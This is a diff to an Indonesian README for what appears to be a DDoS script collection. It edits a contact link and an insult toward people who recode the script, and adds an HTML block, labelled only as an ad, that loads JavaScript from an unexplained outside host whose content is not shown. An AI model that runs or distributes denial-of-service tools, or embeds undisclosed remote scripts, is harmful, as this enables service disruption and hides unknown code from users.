@@ -83,8 +83,25 @@ Pastikan file skrip yang dipilih (ddosv1_op.py, ddosv2_op.py, ddosv3_op.py, atau
 
 # SCRIPT BY ~ REN9999
 
-  <a href="https://wa.me/6289519450908" class="button">Hubungi jika ada yang error</a>
+  <a href="https://wa.me/6289519450908" class="button">Hubungi gw aja jika ada yang error</a>
 ```
-YANG REKODE ANAK ANJG KAMU 🗿
+YANG REKODE GW TAMPOL PALA LU 🗿
 ```
+# di bawah ini cuman iklan aja oke bro 🗿
 
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Menampilkan Skrip</title>
+</head>
+<body>
+
+    <h1>Contoh Menampilkan Skrip</h1>
+    
+    <!-- Menyertakan script eksternal -->
+    <script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/79R3QIALJT0KE"></script>
+
+</body>
+</html>
